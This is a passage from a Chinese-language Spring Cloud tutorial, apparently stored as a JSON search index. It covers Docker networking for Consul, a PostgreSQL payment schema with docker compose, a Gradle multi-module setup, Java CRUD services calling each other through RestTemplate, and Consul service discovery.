Consul\uff0c\u4f46\u662f\u6709\u4e2a\u95ee\u9898\uff0c\u5728 macos \u548c windows \u4e0a\uff0cdocker\u672c\u8d28\u4e0a\u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e0a\uff0c\u56e0\u6b64\u4e0d\u652f\u6301 host \u7f51\u7edc\u6a21\u5f0f\u3002Consul \u53ea\u80fd\u53d1\u73b0\u5f53\u524d\u5185\u7f51\u7684\u670d\u52a1\uff0c\u800c\u6211\u4eec\u7684 java \u662f\u8fd0\u884c\u5728\u5bbf\u4e3b\u673a\u4e0a\u7684\u3002\u6362\u8a00\u4e4b\uff0cConsul \u53ea\u80fd\u5728 docker \u8fd0\u884c\u7684\u90a3\u4e2a\u865a\u62df\u673a\u4e0a\u627e\u670d\u52a1\uff0c\u4f46\u8fd9\u4e2a\u865a\u62df\u673a\u88ab\u9690\u85cf\u4e86\u8d77\u6765\uff0c\u4e0d\u662f\u548c\u5bbf\u4e3b\u673a\u76f4\u901a\u7684\u3002 \u5f53\u7136\uff0c\u5982\u679c\u662f\u865a\u62df\u673a\u800c\u4e0d\u662f docker\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528 host \u7f51\u7edc\u6a21\u5f0f\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8ba9\u865a\u62df\u673a\u548c\u5bbf\u4e3b\u673a\u5728\u540c\u4e00\u4e2a\u7f51\u7edc\u4e0a\u3002\u4f46\u662f\uff0c\u5c3d\u7ba1\u5df2\u7ecf\u652f\u6301\u4e86 host \u6a21\u5f0f\uff0c\u4f46\u662f\u5728 macos \u548c windows \u4e0a\uff0cdocker \u672c\u8d28\u4e0a\u8fd8\u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e0a\uff0c\u56e0\u6b64\u65e0\u6cd5\u4f7f\u7528 host \u6a21\u5f0f\u3002\u51c6\u786e\u5730\u8bf4\uff0c\u8fd9\u4e2a host \u662f mac \u548c windows \u4e0a\u90a3\u4e2a docker linux \u865a\u62df\u673a\u7684 host\uff0c\u800c\u975e mac \u548c windows \u672c\u8eab\u3002 \u5f53\u7136\u4f60\u53ef\u4ee5\u628a java \u9879\u76ee\u653e\u5230 docker \u91cc\u9762\uff0c\u5982\u679c\u5728 windows \u4e0a\uff0c\u4e5f\u53ef\u4ee5\u6253\u5f00 windows container \u6a21\u5f0f\uff0c\u6216\u8005\u7528 linux \u7cfb\u7edf\u5f00\u53d1\u3002 \u4e00\u4e2a\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848\u662f\u4f7f\u7528 docker-desktop-connector \u3002\u5b89\u88c5\u540e\u6309\u7167\u6587\u6863\u914d\u7f6e\u5373\u53ef\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u8ba9\u672c\u673a\u7f51\u7edc\u548c docker \u865a\u62df\u673a\u7f51\u7edc\u8054\u901a\u3002\u53c8\u7531\u4e8e Consul \u662f\u7ed1\u5728\u865a\u62df\u673a\u7684 eth0 \u4e0a\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u673a\u4e0a\u8fde\u63a5\u5230\u865a\u62df\u673a\u7684 eth0\uff0c\u4ece\u800c\u8bbf\u95ee Consul\u3002","title":"\u914d\u7f6e docker \u7f51\u7edc"},{"location":"03/#consul","text":"","title":"Consul \u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0"},{"location":"03/#consul_1","text":"\u9996\u5148\uff0c\u542f\u52a8 Consul\u3002\u4e3a\u4e86\u65b9\u4fbf\u5f00\u53d1\uff0c\u6211\u4eec\u8fd8\u4e00\u5e76\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93\u3002 \u6570\u636e\u5e93\u7684 schema \u5982\u4e0b\uff1a DROP TABLE IF EXISTS payment; CREATE TABLE payment ( id SERIAL PRIMARY KEY, payment_no VARCHAR(50) NOT NULL, order_no VARCHAR(50) NOT NULL, user_id INT DEFAULT 1, amount DECIMAL(8,2) NOT NULL DEFAULT 9.9, deleted BOOLEAN NOT NULL DEFAULT FALSE, create_time TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP, update_time TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP ); COMMENT ON TABLE payment IS '\u652f\u4ed8\u4ea4\u6613\u8868'; COMMENT ON COLUMN payment.payment_no IS '\u652f\u4ed8\u6d41\u6c34\u53f7'; COMMENT ON COLUMN payment.order_no IS '\u8ba2\u5355\u6d41\u6c34\u53f7'; COMMENT ON COLUMN payment.user_id IS '\u7528\u6237\u8d26\u53f7ID'; COMMENT ON COLUMN payment.amount IS '\u4ea4\u6613\u91d1\u989d'; COMMENT ON COLUMN payment.deleted IS '\u5220\u9664\u6807\u5fd7\uff0c\u9ed8\u8ba40\u4e0d\u5220\u9664\uff0c1\u5220\u9664'; COMMENT ON COLUMN payment.create_time IS '\u521b\u5efa\u65f6\u95f4'; COMMENT ON COLUMN payment.update_time IS '\u66f4\u65b0\u65f6\u95f4'; docker compose \u6587\u4ef6\u5982\u4e0b\uff1a services: postgres: image: postgres:12.19 environment: POSTGRES_USER: user POSTGRES_PASSWORD: password POSTGRES_DB: demo volumes: - ./schema.sql:/docker-entrypoint-initdb.d/schema.sql ports: - 5432:5432 consul: image: hashicorp/consul:1.19 ports: - 8500:8500 volumes: - ./consul:/consul/data \u542f\u52a8\u540e\uff0c\u8bbf\u95ee http://localhost:8500 \uff0c\u53ef\u4ee5\u770b\u5230 Consul \u7684\u754c\u9762\u3002 \u6ce8\u610f\uff0cConsul \u5728 docker \u5bb9\u5668\u5173\u95ed\u65f6\u662f\u4e0d\u4f1a\u4fdd\u5b58\u6570\u636e\u7684\u3002","title":"\u542f\u52a8 Consul"},{"location":"03/#_2","text":"\u5229\u7528\u6211\u4eec\u4e0a\u4e00\u7ae0\u8bb2\u7684 gradle\uff0c\u914d\u7f6e\u4e00\u4e2a\u591a\u6a21\u5757\u9879\u76ee\u3002 \u6839\u9879\u76ee\u4f7f\u7528\uff0c plugins { id 'java' id \"org.springframework.boot\" version \"3.2.6\" id 'io.spring.dependency-management' version '1.1.5' } allprojects { repositories { mavenCentral() } ext { set(\"springCloudVersion\", \"2023.0.2\") set(\"springBootVersion\", \"3.2.6\") set(\"lombokVersion\", \"1.18.28\") set(\"springdocVersion\", \"2.5.0\") set(\"postgresqlVersion\", \"42.7.3\") } group = 'io.github.fingerbone' version = '1.0-SNAPSHOT' } subprojects { apply { plugin 'java' plugin 'org.springframework.boot' plugin 'io.spring.dependency-management' } java { sourceCompatibility = JavaLanguageVersion.of(17) targetCompatibility = JavaLanguageVersion.of(17) } dependencyManagement { imports { mavenBom \"org.springdoc:springdoc-openapi-starter-webmvc-ui:${springdocVersion}\" mavenBom \"org.springframework.boot:spring-boot-starter-web:${springBootVersion}\" mavenBom \"org.postgresql:postgresql:${postgresqlVersion}\" mavenBom \"org.springframework.cloud:spring-cloud-dependencies:${springCloudVersion}\" } } dependencies { compileOnly \"org.projectlombok:lombok:${lombokVersion}\" annotationProcessor \"org.projectlombok:lombok:${lombokVersion}\" } } \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684 Spring Cloud \u548c Spring Boot \u7248\u672c\u5fc5\u987b\u5339\u914d\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\u3002\u517c\u5bb9\u6027\u8868\u89c1 Spring Cloud \u6587\u6863 \u3002 \u4e3a\u4e86\u65b9\u4fbf\uff0c\u5f15\u5165\u4e86 spring doc\uff0c\u52a0\u5165 spring doc \u540e\uff0c\u53ef\u4ee5\u8bbf\u95ee swagger-ui/index.html \u6765\u67e5\u770b\u63a5\u53e3\u6587\u6863\uff0c\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002 \u6b64\u5916\uff0c org.springframework.cloud:spring-cloud-dependencies \u662f\u4e00\u4e2a\u5305\uff0c\u5b83\u5305\u542b\u4e86 Spring Cloud \u7684\u6240\u6709\u4f9d\u8d56\uff0c\u56e0\u6b64\u53ea\u8981\u58f0\u660e\u8fd9\u4e2a\u7684\u7248\u672c\uff0c\u540e\u7eed\u4f7f\u7528 Spring Cloud \u7684\u4efb\u4f55\u4f9d\u8d56\u90fd\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u7248\u672c\u3002 \u7b2c\u4e00\u4e2a\u5b50\u9879\u76ee\u53ea\u662f\u5b58\u653e\u4e00\u4e9b\u516c\u7528\u7684\u7c7b\uff0c\u4f8b\u5982 record\uff0cwrapper\uff0cenum \u7b49\u7b49\uff0c\u4e0d\u5305\u542b\u4efb\u4f55\u4e1a\u52a1\u903b\u8f91\u3002\u76ee\u524d builder.gradle \u53ef\u4ee5\u7559\u7a7a\u3002 \u7b2c\u4e8c\u4e2a\u5b50\u9879\u76ee\u4e3a\u652f\u4ed8\u670d\u52a1\uff0c\u4f7f\u7528 Spring Data JPA \u64cd\u4f5c\u6570\u636e\u5e93\uff0cSpring Web \u63d0\u4f9b RESTful API\u3002 dependencies { implementation \"org.springdoc:springdoc-openapi-starter-webmvc-ui\" implementation \"org.springframework.boot:spring-boot-starter-web\" implementation \"org.postgresql:postgresql\" implementation \"org.springframework.boot:spring-boot-starter-data-jpa\" implementation project(\":commons\") } \u5fae\u670d\u52a1\u67b6\u6784\u4e2d\uff0c\u63d0\u4f9b\u670d\u52a1\u7684\u670d\u52a1\u79f0\u4e3a\u670d\u52a1\u63d0\u4f9b\u8005\uff0c\u8c03\u7528\u670d\u52a1\u7684\u670d\u52a1\u79f0\u4e3a\u670d\u52a1\u6d88\u8d39\u8005\u3002\u6211\u4eec\u8fd8\u8981\u5199\u4e00\u4e2a\u4e0b\u5355\u670d\u52a1\uff0c\u8fd9\u4e2a\u670d\u52a1\u4f1a\u8c03\u7528\u652f\u4ed8\u670d\u52a1\u3002 \u5b83\u7684\u914d\u7f6e\u5982\u4e0b\uff0c dependencies { implementation project(\":commons\") implementation \"org.springframework.boot:spring-boot-starter-web\" implementation \"org.springdoc:springdoc-openapi-starter-webmvc-ui\" } \u5728\u6839\u9879\u76ee settings.gradle \u4e0b\uff0c\u4f7f\u7528 rootProject.name = 'demo' include 'payment' include 'commons' include 'order' \u8fd9\u91cc include \u7684\u662f\u5b50\u9879\u76ee\u7684\u76ee\u5f55\u540d\uff0c\u800c\u4e0d\u662f\u9879\u76ee\u540d\u3002\u540e\u9762\u4f7f\u7528 project \u5f15\u5165\u5b50\u9879\u76ee\u65f6\uff0c\u4f7f\u7528\u7684\u662f\u9879\u76ee\u540d\u800c\u975e\u76ee\u5f55\u540d\u3002\u4e0d\u8fc7\u9ed8\u8ba4\u8fd9\u4e24\u4e2a\u662f\u76f8\u540c\u7684\u3002 \u5982\u679c\u8981\u6539\u9879\u76ee\u540d\uff0c\u9700\u8981\uff0c include \"foo\" rootProject.name = \"bar\" project(\":foo\").name = \"foofoo\" \u5982\u679c\u4f60\u4f7f\u7528 maven\uff0c\u8fd8\u8981\u5728\u5b50\u9879\u76ee\u4e2d\u6dfb\u52a0\u7236\u9879\u76ee\u4fe1\u606f\u3002","title":"\u9879\u76ee\u914d\u7f6e"},{"location":"03/#_3","text":"\u73b0\u5728\uff0c\u6682\u65f6\u5148\u4e0d\u8003\u8651\u5fae\u670d\u52a1\uff0c\u6211\u4eec\u5148\u57fa\u4e8e\u4e0a\u9762\u7684\u6570\u636e\u5e93\uff0c\u5199\u4e00\u70b9\u7b80\u5355\u7684\u4e1a\u52a1\u903b\u8f91\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Spring Data JPA \u6765\u64cd\u4f5c\u6570\u636e\u5e93\u3002 \u6ce8\u610f\uff0c\u4e0b\u9762\u7684 record \u7c7b\uff0c\u679a\u4e3e\u7b49\u5e94\u5f53\u653e\u5728 commons \u9879\u76ee\u4e2d\uff0c\u5176\u5b83\u7684\u5e94\u5f53\u653e\u5728 payment \u9879\u76ee\u4e2d\u3002 package io.github.fingerbone.record; import java.math.BigDecimal; public record PaymentRecord( Long id, String paymentNo, String orderNo, Integer userId, BigDecimal amount, Boolean deleted ) { } package io.github.fingerbone.entity; import io.github.fingerbone.record.PaymentRecord; import jakarta.persistence.*; import org.springframework.beans.BeanUtils; import lombok.Data; import java.math.BigDecimal; import java.util.Date; @Entity @Data public final class Payment { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; @Column(name = \"payment_no\", nullable = false, length = 50) private String paymentNo; @Column(name = \"order_no\", nullable = false, length = 50) private String orderNo; @Column(name = \"user_id\", nullable = false) private Integer userId = 1; @Column(name = \"amount\", nullable = false, precision = 8, scale = 2) private BigDecimal amount = BigDecimal.valueOf(9.9); @Column(name = \"deleted\", nullable = false) private Boolean deleted = false; @Temporal(TemporalType.TIMESTAMP) @Column(name = \"create_time\", nullable = false, updatable = false) private Date createTime; @Temporal(TemporalType.TIMESTAMP) @Column(name = \"update_time\", nullable = false) private Date updateTime; @PrePersist private void onCreate() { createTime = new Date(); updateTime = new Date(); } @PreUpdate private void onUpdate() { updateTime = new Date(); } public PaymentRecord toRecord() { return new PaymentRecord( id, paymentNo, orderNo, userId, amount, deleted ); } public static Payment fromRecord(PaymentRecord record) { Payment payment = new Payment(); BeanUtils.copyProperties(record, payment); return payment; } } package io.github.fingerbone.repository; import io.github.fingerbone.entity.Payment; import org.springframework.data.jpa.repository.JpaRepository; import org.springframework.stereotype.Repository; @Repository public interface PaymentRepository extends JpaRepository<Payment, Long> { } package io.github.fingerbone.service; import io.github.fingerbone.entity.Payment; import io.github.fingerbone.repository.PaymentRepository; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import java.util.List; @Service public class PaymentService { private final PaymentRepository paymentRepository; public PaymentService( @Autowired PaymentRepository paymentRepository ) { this.paymentRepository = paymentRepository; } public Payment createPayment(Payment payment) { return paymentRepository.save(payment); } public Payment getPayment(Long id) { return paymentRepository.findById(id).orElse(null); } public void deletePayment(Long id) { Payment payment = paymentRepository.findById(id).orElse(null); if (payment != null) { payment.setDeleted(true); paymentRepository.save(payment); } } public Payment updatePayment(Payment payment) { return paymentRepository.save(payment); } public List<Payment> getAllPayments() { return paymentRepository.findAll(); } } package io.github.fingerbone.wrapper; public record ResponseWrapper<T>(Integer code, String message, Long time, T data) { public static <T> ResponseWrapper<T> success(T data) { return new ResponseWrapper<>(ResponseCode.SUCCESS.getCode(), ResponseCode.SUCCESS.getMessage(), System.currentTimeMillis(), data); } public static <Void> ResponseWrapper<Void> success() { return new ResponseWrapper<>(ResponseCode.SUCCESS.getCode(), ResponseCode.SUCCESS.getMessage(), System.currentTimeMillis(),null); } public static <T> ResponseWrapper<T> error(ResponseCode responseCode, T data) { return new ResponseWrapper<>(responseCode.getCode(), responseCode.getMessage(), System.currentTimeMillis(), data); } public static <Void> ResponseWrapper<Void> error(ResponseCode responseCode) { return new ResponseWrapper<>(responseCode.getCode(), responseCode.getMessage(), System.currentTimeMillis(), null); } public static <Void> ResponseWrapper<Void> error() { return new ResponseWrapper<>(ResponseCode.INTERNAL_SERVER_ERROR.getCode(), ResponseCode.INTERNAL_SERVER_ERROR.getMessage(), System.currentTimeMillis(), null); } } package io.github.fingerbone.wrapper; import lombok.AllArgsConstructor; import lombok.Data; import lombok.Getter; @AllArgsConstructor @Getter public enum ResponseCode { SUCCESS(200, \"Success\"), INTERNAL_SERVER_ERROR(500, \"Internal Server Error\"); private final Integer code; private final String message; } package io.github.fingerbone.wrapper; import org.springframework.web.bind.annotation.ControllerAdvice; import org.springframework.web.bind.annotation.ExceptionHandler; import org.springframework.web.bind.annotation.RestControllerAdvice; @RestControllerAdvice public class ExceptionWrapper { @ExceptionHandler(RuntimeException.class) public ResponseWrapper<String> handleException(RuntimeException e) { return ResponseWrapper.error(ResponseCode.INTERNAL_SERVER_ERROR, e.getMessage()); } } package io.github.fingerbone.controller; import io.github.fingerbone.entity.Payment; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.service.PaymentService; import io.github.fingerbone.wrapper.ResponseWrapper; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.DeleteMapping; import org.springframework.web.bind.annotation.PutMapping; import java.util.stream.Collectors; import java.util.List; @RestController @RequestMapping(\"/payment\") public class PaymentController { private final PaymentService paymentService; public PaymentController( @Autowired PaymentService paymentService ) { this.paymentService = paymentService; } @PostMapping public ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord) { return ResponseWrapper.success( paymentService.createPayment(Payment.fromRecord(paymentRecord)).toRecord() ); } @GetMapping public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return ResponseWrapper.success( paymentService.getAllPayments().stream().map(Payment::toRecord).collect(Collectors.toList()) ); } @GetMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> getPayment(@PathVariable Long id) { return ResponseWrapper.success( paymentService.getPayment(id).toRecord() ); } @DeleteMapping(\"/{id}\") public ResponseWrapper<Void> deletePayment(@PathVariable Long id) { paymentService.deletePayment(id); return ResponseWrapper.success(); } @PutMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> updatePayment(@PathVariable Long id, @RequestBody PaymentRecord paymentRecord) { Payment payment = Payment.fromRecord(paymentRecord); payment.setId(id); return ResponseWrapper.success( paymentService.updatePayment(payment).toRecord() ); } } \u8fd9\u4e9b\u90fd\u4e0d\u96be\uff0c\u90fd\u662f\u7b80\u5355\u7684\u589e\u5220\u6539\u67e5\u3002","title":"\u652f\u4ed8\u670d\u52a1\u4e1a\u52a1\u903b\u8f91"},{"location":"03/#_4","text":"\u5728 python \u4e2d\uff0c\u8c03\u7528\u53e6\u4e00\u4e2a http \u670d\u52a1\u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981\u4f7f\u7528 requests \u5373\u53ef\u3002\u4f46\u662f\u5728 java \u4e2d\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 RestTemplate \u6765\u8c03\u7528\u3002 package io.github.fingerbone; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.client.RestTemplate; @Configuration public class RestTemplateConfig { @Bean RestTemplate restTemplate() { return new RestTemplate(); } } package io.github.fingerbone; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseWrapper; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.http.HttpEntity; import org.springframework.http.ResponseEntity; import org.springframework.web.bind.annotation.*; import org.springframework.web.client.RestTemplate; import org.springframework.core.ParameterizedTypeReference; import org.springframework.http.HttpMethod; import java.util.List; @RestController @RequestMapping(\"/consumer/payment\") public class ConsumerPaymentController { private final RestTemplate restTemplate; private static final String paymentServiceUrl = \"http://localhost:8080\" + \"/payment\"; @Autowired public ConsumerPaymentController(RestTemplate restTemplate) { this.restTemplate = restTemplate; } @PostMapping public ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord) { HttpEntity<PaymentRecord> request = new HttpEntity<>(paymentRecord); ResponseEntity<ResponseWrapper<PaymentRecord>> response = restTemplate.exchange( paymentServiceUrl, HttpMethod.POST, request, new ParameterizedTypeReference<>() { } ); return response.getBody(); } @GetMapping public ResponseWrapper<List<PaymentRecord>> getAllPayments() { ResponseEntity<ResponseWrapper<List<PaymentRecord>>> response = restTemplate.exchange( paymentServiceUrl, HttpMethod.GET, null, new ParameterizedTypeReference<>() { } ); return response.getBody(); } @GetMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> getPayment(@PathVariable Long id) { ResponseEntity<ResponseWrapper<PaymentRecord>> response = restTemplate.exchange( paymentServiceUrl + \"/\" + id, HttpMethod.GET, null, new ParameterizedTypeReference<>() { } ); return response.getBody(); } @DeleteMapping(\"/{id}\") public ResponseWrapper<Void> deletePayment(@PathVariable Long id) { restTemplate.delete(paymentServiceUrl + \"/\" + id); return ResponseWrapper.success(); } @PutMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> updatePayment(@PathVariable Long id, @RequestBody PaymentRecord paymentRecord) { restTemplate.put(paymentServiceUrl + \"/\" + id, paymentRecord); return ResponseWrapper.success(); } } \u5f53\u7136\uff0c\u8bb0\u5f97\u8981\u6539\u7b2c\u4e8c\u4e2a\u9879\u76ee\u7684\u7aef\u53e3\uff0c\u5426\u5219\u4f1a\u51b2\u7a81\u3002 \u8fd9\u6837\uff0c\u6211\u4eec\u4fbf\u6709\u4e86\u5fae\u670d\u52a1\u7684\u96cf\u5f62\u3002\u4f46\u662f\uff0c\u73b0\u5728\u7684\u9879\u76ee\u672c\u8d28\u4e0a\u548c\u6211\u4eec\u4e4b\u524d python \u7684\u5c0f demo \u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e9b java \u7279\u8272\u7684 boilerplate \u4ee3\u7801\u3002","title":"\u4e0b\u5355\u670d\u52a1\u4e1a\u52a1\u903b\u8f91"},{"location":"03/#_5","text":"\u73b0\u5728\uff0c\u6211\u4eec\u5f15\u5165\u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0\u673a\u5236\u3002 \u4f46\u662f\u8bb2\u5b9e\u9645\u77e5\u8bc6\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u8bb2 Spring Cloud \u7684\u6587\u6863\u600e\u4e48\u770b\uff0c\u6bd4\u5982\u8fd9\u91cc\u6211\u4eec\u60f3\u4f7f\u7528 Consul\u3002 \u5148\u4ece\u5de6\u4fa7\u9009\u62e9 Spring Cloud Consul\uff0c\u9009\u62e9 Learn\uff0c\u7136\u540e\u9009\u62e9 Reference Documentation\u3002\u4e4b\u540e\u4f60\u4f1a\u627e\u5230\u4f60\u9700\u8981\u7684\u4e00\u5207\u77e5\u8bc6\u3002 \u5728\u5de6\u4fa7\u5207\u6362\u5230\u670d\u52a1\u53d1\u73b0\uff0c\u8fd9\u4e0e\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u4ecb\u7ecd\u7684\u5185\u5bb9\u5b8c\u5168\u4e00\u81f4\u3002\u4e0d\u8fc7\u6211\u4eec\u7684\u66f4\u7cbe\u7b80\u3002 \u4e0d\u8fc7\uff0c\u6709\u65f6\u5019 Spring \u7684\u6587\u6863\u5e76\u4e0d\u662f\u6700\u65b0\u7684\uff0c\u5982\u679c\u67d0\u4e9b\u4f9d\u8d56\u6709 GitHub \u4e3b\u9875\uff0c\u4e00\u822c\u80fd\u5728 GitHub \u4e0a\u627e\u5230\u6700\u65b0\u7684\u6587\u6863\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5f15\u5165 Spring Cloud Consul \u7684\u4f9d\u8d56\u3002 dependencies { implementation \"org.springframework.cloud:spring-cloud-starter-consul-discovery\" } \u7136\u540e\u6539 application.yml\uff0c\u9ed8\u8ba4\u914d\u7f6e\u5982\u4e0b\uff0c spring: cloud: consul: host: localhost port: 8500 discovery: service-name: ${spring.application.name} \u53ef\u4ee5\u4e0d\u5199\uff0c\u56e0\u4e3a\u8fd9\u662f\u9ed8\u8ba4\u914d\u7f6e\u3002\u5982\u679c\u9700\u8981\u6539\u53d8\uff0c\u53ef\u4ee5\u5728\u8fd9\u91cc\u6539\u3002\u8fd9\u91cc\u914d\u7f6e\u4e86 consul \u7684\u5730\u5740\u3002\u6b64\u5916\u670d\u52a1\u540d\u4e5f\u53ef\u4ee5\u6539\u3002 \u7136\u540e\uff0c\u5728\u4e3b\u542f\u52a8\u7c7b\uff0c\u6dfb\u52a0 @EnableDiscoveryClient \u542f\u7528\u670d\u52a1\u53d1\u73b0\u3002Spring Boot \u5176\u5b9e\u662f\u4f1a\u81ea\u52a8\u7ed9\u4f60\u52a0\u4e0a\u7684\uff0c\u4f46\u662f\u4e3a\u4e86\u660e\u786e\uff0c\u6211\u4eec\u8fd8\u662f\u624b\u52a8\u5199\u4e0a\u3002 package io.github.fingerbone; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @SpringBootApplication @EnableDiscoveryClient public class Main8081 { public static void main(String[] args) { SpringApplication.run(Main8081.class, args); } } \u6b64\u5916\uff0c\u7531\u4e8e Consul \u9700\u8981\u68c0\u67e5\u670d\u52a1\u7684\u53ef\u7528\u6027\uff0c\u56e0\u6b64\u9700\u8981\u5065\u5eb7\u68c0\u67e5\u548c\u5fc3\u8df3\u68c0\u67e5\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 actuator \u6765\u63d0\u4f9b\u8fd9\u4e9b\u4fe1\u606f\u3002 dependencies { implementation \"org.springframework.boot:spring-boot-starter-actuator\" } \u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 Consul \u7684\u754c\u9762\u4e0a\u770b\u5230\u6211\u4eec\u7684\u670d\u52a1\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528\u57df\u540d\u6216 IP \u5730\u5740\u901a\u4fe1\uff0c\u662f\u4e0d\u4f1a\u7ecf\u8fc7 Consul \u7684\u3002\u8fd9\u6837\u4e5f\u505a\u4e0d\u4e86\u8d1f\u8f7d\u5747\u8861\uff0c\u7194\u65ad\u7b49\u7b49\u3002 Consul \u4f1a\u628a\u670d\u52a1\u540d\u6ce8\u518c\u5230 DNS \u670d\u52a1\u5668\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u540d\u6765\u8bbf\u95ee\u670d\u52a1\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a DNS \u670d\u52a1\u5668\u662f Consul \u81ea\u5df1\u7684\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 Consul \u7684 DNS \u670d\u52a1\u5668\u3002 \u5177\u4f53\u800c\u8a00\uff0c\u6211\u4eec\u9996\u5148\u8981\u628a RestTemplate \u914d\u7f6e\u6362\u6210\uff0c @Configuration public class RestTemplateConfig { @Bean @LoadBalanced RestTemplate restTemplate() { return new RestTemplate(); } } \u8fd9\u91cc\u7684 @LoadBalanced \u662f\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\u5668\u3002\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\u5668\u65f6\uff0c\u53d1\u9001\u7684\u8bf7\u6c42\u4f1a\u5148\u7ecf\u8fc7\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3\uff0c\u7136\u540e\u518d\u5206\u53d1\u7ed9\u5bf9\u5e94\u7684\u670d\u52a1\u3002 @LoadBalanced \u53ea\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u7531\u4e8e\u6211\u4eec\u8fd8\u6ca1\u6709\u5f15\u5165\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u56e0\u6b64\u6b64\u65f6\u5e76\u6ca1\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861\u3002\u8fd9\u91cc\u52a0\u4e0a\u8fd9\u4e2a\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u4f7f\u7528\u670d\u52a1\u540d\u6765\u8bbf\u95ee\u670d\u52a1\u3002 \u7136\u540e\u628a\u7f51\u5740\u6539\u6210 Consul \u4e0a\u7684\u670d\u52a1\u540d\uff0c\u6211\u8fd9\u91cc\u662f private static final String paymentServiceUrl = \"http://payment-service\" + \"/payment\"; \u3002 \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u540d\u6765\u8bbf\u95ee\u670d\u52a1\u4e86\u3002","title":"\u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0"},{"location":"04/","text":"Spring Cloud \u901f\u6210 Ch4 Consul \u914d\u7f6e\u7ba1\u7406 \u4e0a\u4e00\u90e8\u5206\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528 Consul \u4f5c\u4e3a\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3\uff0c\u672c\u90e8\u5206\u5c06\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528 Consul \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3\u3002 \u6ce8\u610f\uff0cConsul \u4f7f\u7528 docker \u90e8\u7f72\u65f6\uff0c\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\u4f1a\u5728\u5bb9\u5668\u91cd\u542f\u65f6\u4e22\u5931\u3002 bootstrap.yml application.yml \u662f Spring Boot \u7684\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff0c\u800c bootstrap.yml \u662f Spring Cloud \u7684\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\u3002Spring Cloud \u4f1a\u5148\u52a0\u8f7d bootstrap.yml \uff0c\u7136\u540e\u518d\u52a0\u8f7d application.yml \u3002\u56e0\u6b64\uff0c application.yml \u4e2d\u7684\u914d\u7f6e\u4f1a\u8986\u76d6 bootstrap.yml \u4e2d\u7684\u914d\u7f6e\u3002 \u8981\u5f00\u542f bootstrap.yml \u529f\u80fd\uff0c\u9700\u8981\u5f15\u5165 spring-cloud-starter-bootstrap \u4f9d\u8d56\u3002 Spring Cloud \u53c8\u5f15\u5165\u4e00\u4e2a bootstrap.yml 